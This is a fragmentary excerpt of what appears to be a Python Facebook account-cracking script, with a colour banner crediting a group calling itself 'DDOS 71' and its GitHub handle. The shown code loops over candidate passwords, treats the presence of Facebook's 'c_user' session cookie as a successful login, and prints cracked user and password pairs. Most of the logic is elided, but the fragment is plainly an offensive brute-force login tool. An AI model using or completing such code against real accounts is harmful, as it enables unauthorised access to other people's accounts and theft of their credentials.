...
\033[0;91mAUTHOR   : ADMIN OF DDOS 71 

 

\033[0;93mFACEBOOK : ALEX XHAMED SAMI KING

 

\033[0;96mGITHUB   :  BD-DDOS71-HACKERS
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s[FAHIM-CP] %s | %s ' % (M, user, pw))
